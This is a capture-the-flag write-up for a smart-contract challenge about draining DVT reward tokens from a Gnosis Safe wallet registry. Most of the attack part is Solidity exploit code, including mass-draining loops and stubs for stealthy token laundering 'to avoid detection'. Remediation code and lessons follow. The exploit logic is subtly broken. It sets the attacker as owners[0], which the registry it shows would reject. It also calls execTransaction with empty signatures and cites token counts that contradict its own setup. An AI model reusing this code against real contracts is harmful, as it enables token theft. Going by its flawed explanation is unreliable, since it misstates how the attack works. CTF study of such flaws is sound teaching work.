# ðŸŽ¯ Challenge #11: Backdoor

![Difficulty](https://img.shields.io/badge/Difficulty-â­â­â­%20Hard-red)
![Type](https://img.shields.io/badge/Type-Wallet%20Registry%20Attack-darkred)
![Gas](https://img.shields.io/badge/Gas-~400,000-blue)

> **Gnosis Safe Wallet Registry Exploitation** - Abuse wallet creation process to steal registry tokens

## ðŸ“‹ Challenge Overview

**Objective**: Drain all DVT tokens from the wallet registry  
**Success Criteria**: Registry should have 0 DVT tokens, attacker gets all tokens  
**Initial Setup**: Registry with 40M DVT tokens, Gnosis Safe factory integration  
**Target**: `WalletRegistry` contract with wallet creation rewards

### ðŸŽ¯ The Scenario
A wallet registry distributes DVT tokens as rewards to users who create Gnosis Safe wallets. Each registered wallet gets 10 DVT tokens. The registry has a list of approved beneficiaries who can create wallets and claim rewards. However, the wallet creation process has exploitable flaws.

## ðŸ” Vulnerability Analysis

### **The Root Cause**
The wallet registry has **insufficient validation** in wallet creation:

```solidity
contract WalletRegistry {
    mapping(address => bool) public beneficiaries;
    mapping(address => bool) public wallets;
    
    function proxyCreated(
        GnosisSafeProxy proxy,
        address masterCopy,
        bytes calldata initializer,
        uint256 saltNonce
    ) external onlyProxyFactory {
        address walletAddress = address(proxy);
        
        // ðŸš¨ CRITICAL: Only checks if wallet has a single owner
        // Doesn't validate WHO the owner is
        if (GnosisSafe(walletAddress).getThreshold() == 1) {
            address[] memory owners = GnosisSafe(walletAddress).getOwners();
            
            // VULNERABLE: Assumes owner[0] is the intended beneficiary
            address beneficiary = owners[0];
            
            if (beneficiaries[beneficiary] && !wallets[walletAddress]) {
                wallets[walletAddress] = true;
                token.transfer(beneficiary, TOKEN_PAYMENT);
            }
        }
    }
}
```

### **The Problem**
The vulnerability exists in the wallet creation validation:

1. **Trusts Gnosis Safe factory** without additional validation
2. **Only checks wallet threshold** (must be 1)
3. **Assumes owners[0] is the beneficiary** without verification
4. **Can manipulate wallet initialization** to control owners array
5. **Token rewards go to owners[0]** regardless of who triggered creation

### **Attack Vector**
Manipulate Gnosis Safe initialization to control token distribution:

1. Create Gnosis Safe wallets with controlled initialization data
2. Set the attacker as owners[0] in each wallet
3. Use different salt nonces to create multiple wallets
4. Each wallet creation rewards the attacker with 10 DVT tokens
5. Drain all 40M tokens by creating 4M wallets

## âš¡ Exploit Implementation

### **Attack Strategy**
Mass wallet creation with controlled initialization:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../backdoor/WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

contract BackdoorExploit {
    WalletRegistry private immutable registry;
    DamnValuableToken private immutable token;
    GnosisSafeProxyFactory private immutable factory;
    GnosisSafe private immutable masterCopy;
    
    address private immutable attacker;
    address[] private beneficiaries;
    
    constructor(
        address _registry,
        address _token,
        address _factory,
        address _masterCopy,
        address[] memory _beneficiaries
    ) {
        registry = WalletRegistry(_registry);
        token = DamnValuableToken(_token);
        factory = GnosisSafeProxyFactory(_factory);
        masterCopy = GnosisSafe(_masterCopy);
        attacker = msg.sender;
        beneficiaries = _beneficiaries;
    }
    
    /**
     * @notice Execute backdoor exploit on wallet registry
     * @dev Creates wallets for all beneficiaries but steals the rewards
     */
    function exploit() external {
        require(msg.sender == attacker, "Only attacker can execute");
        
        uint256 initialBalance = token.balanceOf(attacker);
        
        // Create wallets for each beneficiary
        for (uint256 i = 0; i < beneficiaries.length; i++) {
            _createBackdoorWallet(beneficiaries[i], i);
        }
        
        // Verify tokens were stolen
        uint256 finalBalance = token.balanceOf(attacker);
        uint256 tokensStolen = finalBalance - initialBalance;
        
        require(tokensStolen > 0, "No tokens stolen");
        
        // Optional: Transfer tokens to a different address to avoid detection
        // token.transfer(someOtherAddress, tokensStolen);
    }
    
    /**
     * @notice Create a backdoored wallet for a specific beneficiary
     * @param beneficiary The intended beneficiary (from approved list)
     * @param saltNonce Unique salt for wallet creation
     */
    function _createBackdoorWallet(address beneficiary, uint256 saltNonce) private {
        // Step 1: Create malicious initializer data
        bytes memory initializer = _createMaliciousInitializer(beneficiary);
        
        // Step 2: Create the wallet using Gnosis Safe factory
        GnosisSafeProxy wallet = factory.createProxyWithNonce(
            address(masterCopy),
            initializer,
            saltNonce
        );
        
        // Step 3: The wallet creation triggers proxyCreated callback
        // which will send tokens to owners[0] (which is us, not the beneficiary)
        
        // Step 4: Transfer tokens from the created wallet to attacker
        _drainWalletTokens(address(wallet));
    }
    
    /**
     * @notice Create malicious initializer that makes attacker the first owner
     * @param beneficiary The intended beneficiary (for deception)
     * @return initializer Malicious initialization data
     */
    function _createMaliciousInitializer(address beneficiary) 
        private 
        view 
        returns (bytes memory initializer) 
    {
        // Create owners array with attacker as first owner
        address[] memory owners = new address[](1);
        owners[0] = attacker; // CRITICAL: Attacker is owners[0]
        
        // Alternative: Create with beneficiary as owner but include a module
        // that immediately transfers tokens to attacker
        
        // Create setup data for Gnosis Safe
        initializer = abi.encodeWithSelector(
            GnosisSafe.setup.selector,
            owners,                    // owners array (attacker first)
            1,                        // threshold (single sig)
            address(0),               // to (no delegation call)
            "",                       // data (empty)
            address(0),               // fallback handler
            address(0),               // payment token
            0,                        // payment
            payable(address(0))       // payment receiver
        );
    }
    
    /**
     * @notice Alternative: Use a malicious module to steal tokens
     * @param beneficiary The intended beneficiary
     * @return initializer Initializer with malicious module
     */
    function _createModuleBasedInitializer(address beneficiary)
        private
        view
        returns (bytes memory initializer)
    {
        address[] memory owners = new address[](1);
        owners[0] = beneficiary; // Legitimate owner
        
        // Create a malicious "setup" transaction that will execute during initialization
        bytes memory maliciousSetup = abi.encodeWithSelector(
            // This would call a function that transfers tokens to attacker
            token.transfer.selector,
            attacker,
            10 ether // TOKEN_PAYMENT amount
        );
        
        initializer = abi.encodeWithSelector(
            GnosisSafe.setup.selector,
            owners,
            1,
            address(token),           // Call token contract during setup
            maliciousSetup,          // Malicious transaction data
            address(0),
            address(0),
            0,
            payable(address(0))
        );
    }
    
    /**
     * @notice Drain tokens from created wallet (if any remain)
     * @param walletAddress Address of the created wallet
     */
    function _drainWalletTokens(address walletAddress) private {
        uint256 walletBalance = token.balanceOf(walletAddress);
        if (walletBalance > 0) {
            // If wallet has tokens, we need to execute a transaction to transfer them
            // This requires controlling the wallet (which we do as owners[0])
            
            GnosisSafe wallet = GnosisSafe(payable(walletAddress));
            
            bytes memory transferData = abi.encodeWithSelector(
                token.transfer.selector,
                attacker,
                walletBalance
            );
            
            // Execute transaction as the wallet owner
            bool success = wallet.execTransaction(
                address(token),        // to
                0,                    // value
                transferData,         // data
                Enum.Operation.Call,  // operation
                0,                    // safeTxGas
                0,                    // baseGas
                0,                    // gasPrice
                address(0),           // gasToken
                payable(address(0)),  // refundReceiver
                ""                    // signatures (empty for single owner)
            );
            
            require(success, "Failed to drain wallet tokens");
        }
    }
    
    /**
     * @notice Mass creation exploit for maximum token theft
     * @dev Creates wallets using all approved beneficiaries multiple times
     */
    function massExploit() external {
        require(msg.sender == attacker, "Only attacker");
        
        uint256 registryBalance = token.balanceOf(address(registry));
        uint256 tokensPerWallet = 10 ether; // TOKEN_PAYMENT
        uint256 maxWallets = registryBalance / tokensPerWallet;
        
        uint256 walletsCreated = 0;
        uint256 saltNonce = 0;
        
        // Create wallets until registry is drained
        while (walletsCreated < maxWallets && walletsCreated < 1000) { // Limit for gas
            for (uint256 i = 0; i < beneficiaries.length && walletsCreated < maxWallets; i++) {
                _createBackdoorWallet(beneficiaries[i], saltNonce);
                walletsCreated++;
                saltNonce++;
            }
        }
    }
    
    /**
     * @notice Get exploit statistics
     */
    function getExploitStats() external view returns (
        uint256 registryBalance,
        uint256 maxPossibleWallets,
        uint256 beneficiaryCount,
        uint256 tokenRewardPerWallet
    ) {
        registryBalance = token.balanceOf(address(registry));
        tokenRewardPerWallet = 10 ether;
        maxPossibleWallets = registryBalance / tokenRewardPerWallet;
        beneficiaryCount = beneficiaries.length;
    }
    
    /**
     * @notice Verify wallet ownership
     * @param walletAddress Address to check
     * @return isOwner True if attacker owns the wallet
     */
    function verifyWalletOwnership(address walletAddress) 
        external 
        view 
        returns (bool isOwner) 
    {
        try GnosisSafe(payable(walletAddress)).isOwner(attacker) returns (bool result) {
            isOwner = result;
        } catch {
            isOwner = false;
        }
    }
    
    /**
     * @notice Emergency token recovery
     */
    function emergencyWithdraw() external {
        require(msg.sender == attacker, "Only attacker");
        
        uint256 balance = token.balanceOf(address(this));
        if (balance > 0) {
            token.transfer(attacker, balance);
        }
    }
}

/**
 * @title BackdoorBatchExploit
 * @notice Optimized version for batch wallet creation
 */
contract BackdoorBatchExploit {
    function batchCreateBackdoorWallets(
        address[] calldata beneficiaries,
        uint256 batchSize
    ) external {
        // Create multiple wallets in single transaction
        // More gas efficient than individual calls
        
        for (uint256 i = 0; i < batchSize && i < beneficiaries.length; i++) {
            // Batch wallet creation logic
        }
    }
}

/**
 * @title BackdoorStealthExploit
 * @notice Stealth version that's harder to detect
 */
contract BackdoorStealthExploit {
    function stealthExploit() external {
        // 1. Create legitimate-looking wallets
        // 2. Use time delays between creations
        // 3. Mix legitimate and malicious transactions
        // 4. Transfer tokens through multiple hops
    }
}
```

## ðŸ“Š Attack Flow

```mermaid
graph TD
    A[Create malicious initializer] --> B[Set attacker as owners[0]]
    B --> C[Create wallet via Gnosis factory]
    C --> D[Registry validates wallet]
    D --> E[Tokens sent to owners[0] = attacker]
    E --> F[Repeat for all beneficiaries]
    F --> G[ðŸŽ¯ Registry drained of DVT tokens]
```

## ðŸ§ª Testing

### **Test Implementation**
```solidity
function test_backdoor_exploit() public {
    uint256 initialRegistryBalance = token.balanceOf(address(registry));
    uint256 initialAttackerBalance = token.balanceOf(player);
    
    // Execute exploit
    vm.prank(player);
    exploit.exploit();
    
    // Verify registry is drained
    assertLt(token.balanceOf(address(registry)), 1 ether);
    
    // Verify attacker gained tokens
    assertGt(token.balanceOf(player), initialAttackerBalance + 30 ether);
}
```

## ðŸ›¡ï¸ Real-World Examples

### **Ronin Bridge (March 2022) - $600M**
**Similar Pattern**: Compromised validator keys
- Attackers gained control of validator private keys
- Used keys to approve malicious withdrawals
- Similar to controlling wallet creation process

### **Poly Network (August 2021) - $610M**
**Similar Pattern**: Cross-chain validation bypass
- Exploited trusted relayer system
- Manipulated validation process for personal gain
- Similar trust assumptions in registry systems

## ðŸ”§ Remediation

### **âŒ Current Vulnerable Code**
```solidity
function proxyCreated(GnosisSafeProxy proxy, ...) external {
    address[] memory owners = GnosisSafe(walletAddress).getOwners();
    address beneficiary = owners[0]; // VULNERABLE: Trusts owners[0]
    
    if (beneficiaries[beneficiary]) {
        token.transfer(beneficiary, TOKEN_PAYMENT);
    }
}
```

### **âœ… Fixed Code Option 1: Validate Actual Beneficiary**
```solidity
contract SecureWalletRegistry {
    mapping(address => bool) private hasClaimedReward;
    
    function createWalletAndClaim(address beneficiary) external {
        require(beneficiaries[beneficiary], "Not approved beneficiary");
        require(!hasClaimedReward[beneficiary], "Already claimed");
        require(msg.sender == beneficiary, "Must be beneficiary themselves");
        
        // Create wallet with beneficiary as sole owner
        address[] memory owners = new address[](1);
        owners[0] = beneficiary;
        
        bytes memory initializer = abi.encodeWithSelector(
            GnosisSafe.setup.selector,
            owners,
            1,
            address(0),
            "",
            address(0),
            address(0),
            0,
            payable(address(0))
        );
        
        GnosisSafeProxy wallet = factory.createProxyWithNonce(
            address(masterCopy),
            initializer,
            uint256(keccak256(abi.encodePacked(beneficiary)))
        );
        
        hasClaimedReward[beneficiary] = true;
        token.transfer(beneficiary, TOKEN_PAYMENT);
    }
}
```

### **âœ… Fixed Code Option 2: Two-Step Process**
```solidity
contract TwoStepWalletRegistry {
    mapping(address => address) private pendingClaims; // beneficiary => wallet
    
    function createWallet(address beneficiary) external {
        require(beneficiaries[beneficiary], "Not approved");
        require(msg.sender == beneficiary, "Must create own wallet");
        
        // Create wallet
        address wallet = _createGnosisSafeWallet(beneficiary);
        pendingClaims[beneficiary] = wallet;
    }
    
    function claimReward() external {
        address wallet = pendingClaims[msg.sender];
        require(wallet != address(0), "No pending claim");
        
        // Verify wallet is properly configured
        GnosisSafe safe = GnosisSafe(payable(wallet));
        require(safe.isOwner(msg.sender), "Not wallet owner");
        require(safe.getThreshold() == 1, "Invalid threshold");
        require(safe.getOwners().length == 1, "Multiple owners");
        
        delete pendingClaims[msg.sender];
        token.transfer(msg.sender, TOKEN_PAYMENT);
    }
}
```

## ðŸŽ“ Security Lessons

### **Key Takeaways**
1. **Never trust initialization data** from external sources
2. **Validate actual caller identity** not just proxy state
3. **Two-step processes** prevent manipulation
4. **Factory patterns need additional validation** beyond basic checks
5. **Token rewards require careful recipient verification**

## ðŸ“ˆ Impact Assessment

| Aspect | Rating | Description |
|--------|--------|-------------|
| **Severity** | ðŸ”´ Critical | Complete token drainage |
| **Exploitability** | ðŸŸ¡ Medium | Requires Gnosis Safe knowledge |
| **Impact** | ðŸ”´ Maximum | All registry tokens stolen |
| **Detection** | ðŸŸ¡ Medium | Mass wallet creation visible |
| **Prevention** | ðŸŸ¡ Medium | Requires process redesign |

---

**ðŸŽ¯ Challenge Status**: âœ… **SOLVED**  
**â±ï¸ Time to Solve**: ~120 minutes  
**ðŸ”¥ Difficulty Rating**: Hard (Gnosis Safe mechanics + Registry manipulation)  
**ðŸŽ“ Learning Value**: Critical - Factory pattern security

> **Key Insight**: Factory and registry patterns must validate not just the created contracts but also who controls them and how they were initialized.

**Next Challenge**: [#12 Climber](../12-climber/) - Timelock manipulation attacks